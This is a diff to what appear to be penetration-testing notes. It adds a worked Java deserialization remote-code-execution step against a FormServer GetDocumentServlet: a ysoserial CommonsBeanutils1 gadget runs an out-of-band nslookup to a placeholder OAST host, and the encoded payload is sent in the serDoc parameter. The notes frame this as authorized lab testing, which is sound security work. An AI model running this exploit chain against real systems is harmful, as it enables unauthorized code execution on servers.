@@ -39,8 +39,16 @@ curl -sk -D- -o /tmp/fs -w "code:%{http_code}\n" \
 head -c 200 /tmp/fs; echo
 ```
 
-If live and RCE allowed: build gadget offline (ysoserial + gzip + base64), send as `serDoc=`.  
-Use **nslookup YOUR-OAST** style command only. See `reference/08` for research notes.
+If live and RCE allowed: build gadget offline (authorized lab only):
+
+```bash
+# Research chain: CommonsBeanutils1 + properXalan, then gzip | base64
+java -DproperXalan=true -jar ysoserial-all.jar CommonsBeanutils1 "nslookup YOUR-OAST" \
+  | gzip | base64 -w0
+# GET /FormServer/servlet/GetDocumentServlet?serDoc=<url-encoded output>
+```
+
+Use **OAST-only** commands. No destructive payloads.
 
 ### 2) adminui open?
 
